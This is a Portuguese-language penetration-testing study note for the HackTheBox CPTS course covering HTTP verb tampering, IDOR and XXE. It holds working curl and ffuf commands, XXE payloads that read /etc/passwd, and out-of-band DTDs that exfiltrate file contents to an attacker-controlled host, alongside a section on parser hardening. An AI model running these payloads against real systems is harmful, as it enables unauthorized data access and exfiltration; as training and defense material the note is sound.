---
tema: Web / Exploração
tópico: Web Attacks — verb tampering, IDOR e XXE
tags: [htb, cpts, idor, xxe, verb-tampering, web, ssrf]
dificuldade: medium
---

# 🕸️ CPTS 23 — Web Attacks

> [!info] Objetivo
> Três falhas de lógica/configuração que **não** dependem de injeção clássica de SQL ou de comando:
> **HTTP Verb Tampering** (autorização presa ao método), **IDOR** (autorização presa ao objeto) e **XXE** (parser XML que resolve entidades externas).
> Todas são "acesso indevido": ler o que não é seu, pular a autenticação, ou fazer o servidor buscar arquivos/URLs em seu nome.

---

## 🎯 Quando usar

| Falha | Cheiro no alvo |
|-------|----------------|
| **Verb Tampering** | Página protegida que retorna **401/403** no `GET`; app antiga; Apache/IIS com `<Limit>`/`.htaccess` só em alguns métodos |
| **IDOR** | URLs com `?uid=`, `/document/1337`, `/api/v1/invoice/<id>`; IDs sequenciais; `401` some quando você é o dono |
| **XXE** | Endpoint que recebe **XML/SOAP/SVG/DOCX**; upload que o servidor parseia; resposta ecoa campo do XML |

---

## 🧰 Ferramentas

| Ferramenta | Uso |
|-----------|-----|
| **Burp Suite** | Repetidor, alterar método; extensão **Autorize** para IDOR automático |
| **curl** | `-X` para métodos arbitrários, `-H` para overrides |
| **ffuf / wfuzz** | Fuzzing de IDs e de parâmetros |
| **interactsh / Collaborator** | Callback OOB para XXE blind e SSRF |
| **`xmllint`** | Validar/formatar XML localmente antes de enviar |
| **`nmap` http-* / `nikto`** | Descobrir métodos habilitados e páginas protegidas |

---

## 🔀 1. HTTP Verb Tampering

Autorização implementada **por método** deixa buracos: se o filtro só cobre `GET`/`POST`, métodos exóticos passam.

### Métodos e o que fazer com eles

| Método | Teste |
|--------|-------|
| `GET` | Baseline |
| `POST` | Enviar o mesmo conteúdo por POST |
| `HEAD` | Útil para **bypass de auth** (mesmos headers, sem corpo) e para ler metadados |
| `PUT` | Upload/sobrescrita de arquivo (WebDAV). Se aceito → RCE provável |
| `DELETE` | Remoção de recursos |
| `OPTIONS` | Descobrir métodos suportados (`Allow:`) |
| `PATCH` | Alteração parcial |
| `TRACE` | Reflexão de request (XST, histórico) |
| `CONNECT` | Proxy/túnel (raro) |

### Bypass de 401/403 trocando o método

```bash
# Página admin pede auth no GET — teste o mesmo path com outros métodos
curl -i -X GET     http://<IP>/admin/
curl -i -X POST    http://<IP>/admin/
curl -i -X HEAD    http://<IP>/admin/
curl -i -X OPTIONS http://<IP>/admin/
curl -i -X PUT     http://<IP>/admin/
curl -i -X TRACE   http://<IP>/admin/
```

```bash
# Ver métodos permitidos
curl -i -X OPTIONS http://<IP>/ -H "Origin: http://<IP>"
# Resposta: Allow: GET,POST,HEAD,OPTIONS
```

```apache
# .htaccess mal escrito: só protege um método -> o resto passa
<Limit GET POST>
  require valid-user
</Limit>
# Bypass: use HEAD/OPTIONS/PUT para acessar a mesma área
```

### Override de método (quando o front bloqueia o verbo)

```bash
# Alguns frameworks respeitam o override mesmo sem o método real
curl -i -X POST http://<IP>/admin \
  -H "X-HTTP-Method-Override: PUT" \
  -H "X-Method-Override: PUT" \
  -H "X-HTTP-Method: PUT"
```

> [!tip] HEAD bypassa corpo, não a lógica
> `HEAD` retorna os **headers** da página protegida. Se o filtro só bloqueia corpo de `GET`/`POST`, você obteve confirmação de existência e metadados — ótimo para enumeração.

---

## 🆔 2. IDOR — Insecure Direct Object Reference

O servidor confia no **identificador enviado** e não verifica se ele **pertence ao usuário autenticado**.

### Onde procurar

```text
Query params:    /documents.php?uid=1        /profile?user_id=2
Path segments:   /api/v1/users/1024          /invoice/550e8400...
Corpo do request: {"user_id": 3, "amount": 10}
Cookies/headers: Cookie: uid=1               X-User-Id: 1
Campos ocultos:  <input type="hidden" name="user_id" value="1">
JWT claim:       {"uid":1,"role":"user"}     (troque e re-assine se puder)
```

### Tipos

| Tipo | Descrição | Exemplo |
|------|-----------|---------|
| **Horizontal** | Acessa dado de **outro usuário do mesmo nível** | `/api/user/1001` → 1002 |
| **Vertical** | Acessa função de **nível superior** | `/admin/users` acessível como user comum |
| **Mass reference** | Trocar ID por Enumeração/varredura | `/download/<id>` para milhares de ids |

### Prova rápida

```bash
# 1) Conta A cria recurso -> observe o ID
# 2) Conta B (ou sessão anônima) tenta acessar o MESMO ID
curl -s -b "PHPSESSID=<SESSAO_B>" "http://<IP>/api/v1/documents/1337"

# 3) Se retornar dados da conta A -> IDOR confirmado
```

### Enumeração de IDs

```bash
# IDs numéricos simples: varrer faixa
ffuf -w <(seq 1 5000) -u "http://<IP>/api/v1/documents/FUZZ" \
     -H "Cookie: PHPSESSID=<SESSAO>" \
     -fs 0,1024 -mc all
```

```bash
# Volume grande: gerar wordlist de IDs
seq 1000 1200 > ids.txt
ffuf -w ids.txt -u "http://<IP>/download?uid=FUZZ" -H "Authorization: Bearer <JWT>"
```

### IDOR com ID opaco (UUID/hash)

UUID não impede: se o UUID aparece em algum lugar (link de convite, e-mail, API pública, QR), é **reutilizável**.

```text
- Procure UUID em: comentários, sitemap, respostas JSON, logs do JS
- Hash previsível (md5(user_id)): calcule você mesmo o hash do alvo
- Base64 do ID: decodifique, altere, re-encode (?id=MTIzNA==)
- Encode/duplo encode para bypass: %31%30%30%32, ?id=1%2C2
```

### Bypass de referência indireta

```bash
# Exemplo típico de payload indireto: trocar 'reference' por 'uid' quando o backend aceita ambos
POST /api/transfer  (com "from" sempre = seu user, mas "to"/"ref" controlável)

# Parâmetro extra ignorado pelo front mas lido pelo back
?id=1&id=2
?id=1%00&id=2
{"id":1,"id":2}
```

> [!tip] Autorize automatiza
> Configure a sessão da conta **A** como "high privilege" e navegue com a conta **B**. A extensão reenvia cada request com a sessão A e marca onde a resposta muda — IDOR aparece como "enforced"/"bypassed".

---

## 📜 3. XXE — XML External Entity

O parser XML resolve **entidades externas** definidas no DTD, permitindo ler arquivos e fazer requisições server-side (SSRF).

### 3.1 Leitura de arquivo (in-band)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root>
  <name>&xxe;</name>
</root>
```

```xml
<!-- Windows -->
<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
```

```bash
# Enviar o XML direto
curl -X POST http://<IP>/api/v1/xml -H "Content-Type: application/xml" -d @payload.xml
```

### 3.2 XXE → SSRF (requisição interna)

```xml
<!DOCTYPE root [ <!ENTITY ssrf SYSTEM "http://127.0.0.1:8080/admin"> ]>
<root><data>&ssrf;</data></root>
```

```xml
<!-- Ler recurso interno via wrapper PHP (quando o parser usa stream do PHP) -->
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
```

> [!info] Por que base64 no `php://filter`
> Arquivos com caracteres inválidos quebram o parse XML. Base64 devolve texto seguro. Precisa ser um parser que use os **wrappers do PHP** (ex.: `libxml` em app PHP) — teste, não assuma.

### 3.3 Blind / OOB — DTD externo

Sem eco na resposta: o alvo busca um **DTD hosted por você** e o exfiltra para o seu servidor.

**Seu servidor (evil.dtd):**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://<IP>:<PORT>/?data=%file;'>">
%eval;
%exfil;
```

**Payload para o alvo:**
```xml
<?xml version="1.0"?>
<!DOCTYPE root [ <!ENTITY % xxe SYSTEM "http://<IP>:<PORT>/evil.dtd"> %xxe; ]>
<root/>
```

```bash
# Servindo o DTD e ouvindo o callback
python3 -m http.server <PORT>
# ou com netcat para ver a request crua
nc -lvnp <PORT>
```

```xml
<!-- Exfiltração via FTP: melhor para arquivos MULTILINHA -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://<IP>:<PORT>/%file;'>">
%eval;
%exfil;
```

> [!warning] Por que FTP para multilinha
> Em HTTP, o conteúdo vai na URL/query e quebras de linha invalidam a requisição. FTP aceita linhas no caminho, então `%file;` com `\n` sai inteiro. Suba um coletor FTP simples (`python3 -m pyftpdlib -p 21`).

### 3.4 Error-based XXE (quando não há canal OOB)

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; err SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%err;
```
O erro do parser pode devolver parte do conteúdo do arquivo na mensagem.

### 3.5 Bypass de filtro

| Filtro | Bypass |
|--------|--------|
| Bloqueia a palavra `DOCTYPE`/`SYSTEM` | Encoding (UTF-16), quebra de linha dentro de tags, entidades encadeadas |
| Bloqueia `http://` | `file://`, `ftp://`, wrappers `php://`, `gopher://` (quando suportado) |
| Remove comentários / sanitiza | Use `CDATA` ou parâmetros DTD |
| WAF assina payload | Encoding UTF-16 do XML, `Content-Type: text/xml; charset=utf-16` |

```xml
<!-- UTF-16: alguns WAFs não decodificam; o parser sim -->
<?xml version="1.0" encoding="utf-16"?>
```

### 3.6 Onde XXE aparece

```text
- Endpoints SOAP / XML-RPC (Content-Type: text/xml, application/soap+xml)
- Upload de SVG, DOCX, XLSX, PPTX, RSS/Atom
- APIs que aceitam JSON "ou XML" (troque o Content-Type)
- SAML (XML assinado; XXE antes da validação de assinatura)
- PDF/XPS processados server-side
```

---

## 🛡️ 4. Defesas (lado azul)

| Falha | Correção |
|-------|----------|
| Verb Tampering | Autorizar por **recurso+identidade**, não por método; recusar métodos não usados; deny-by-default no servidor |
| IDOR | Checar **ownership** em cada objeto; usar IDs indiretos (mapeamento server-side); autorização centralizada |
| XXE | Desabilitar DTD/entidades externas no parser (`disallow-doctype-decl`, `resolve_entities=false`); usar parser seguro |

```java
// Exemplo de configuração segura (conceito Java)
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

```php
// PHP/libxml: desabilitar resolução de entidades externas
libxml_disable_entity_loader(true);   // legado (< PHP 8)
// Alternativa moderna: LIBXML_NONET e evitar carregar DTD externo
```

---

## ⚠️ Pegadinhas

- **403 pode esconder método válido**: o `POST` costuma ser o método "real" da app; teste-o antes de concluir que a página é inacessível.
- **IDOR exige duas contas**: sempre valide com **outro usuário** (ou sessão anônima), não só trocando o ID na sua própria sessão.
- **UUID não é autorização**: conhecimento do identificador ≠ permissão. Se vazou, é IDOR.
- **IDOR cego (write)**: editar/deletar recurso de outro usuário também é IDOR — verifique o efeito, não só a leitura.
- **XXE in-band pode truncar**: arquivos multilinha retornam parcial/corrompidos; blind+OOB é mais confiável.
- **`%` em DTD aninhado**: dentro do DTD, o `%` vira `&#x25;` para não fechar a declaração.
- **JSON não é XML**: trocar `Content-Type: application/json` → `text/xml` faz a app parsear XML? Só se ela suportar os dois. Teste.
- **Callback não chega**: egress DNS/HTTP pode estar bloqueado. Teste também `ftp://` e wrappers locais.
- **TRACE/CONNECT**: raramente úteis e frequentemente desabilitados; não perca tempo se `OPTIONS` não os lista.

---

## ✅ Checklist rápido

```text
[ ] Descobrir métodos suportados (OPTIONS / nmap http-methods)
[ ] Em cada página 401/403: repetir com POST, HEAD, PUT, DELETE, PATCH, TRACE
[ ] Testar X-HTTP-Method / X-HTTP-Method-Override
[ ] Mapear todos os identificadores na request (query, path, body, cookie, header)
[ ] Criar recurso como conta A e acessar como conta B (horizontal)
[ ] Tentar função admin como user comum (vertical)
[ ] Fuzz de IDs numéricos e de campos de referência
[ ] Testar ID opaco: base64 decode, hash previsível, UUID vazado
[ ] Testar IDOR de escrita (editar/deletar), não só leitura
[ ] Encontrar endpoints XML/SOAP/upload que parsam XML
[ ] Testar XXE file-read (file:///etc/passwd)
[ ] Testar XXE SSRF (http://127.0.0.1)
[ ] Se sem eco: blind OOB com DTD externo + listener
[ ] Se filtrado: UTF-16, CDATA, wrappers php:// e ftp://
[ ] Documentar payload e evidência de impacto
```

---

## 🔗 Relacionado

- [[CPTS 22 - Command Injections]]
- [[CPTS 14 - Using Web Proxies]]
- [[CPTS 17 - SQL Injection Fundamentals]]
- [[CPTS 24 - Attacking Common Applications]]
- [[Fase 06 - Vulnerabilidade e Exploração]]
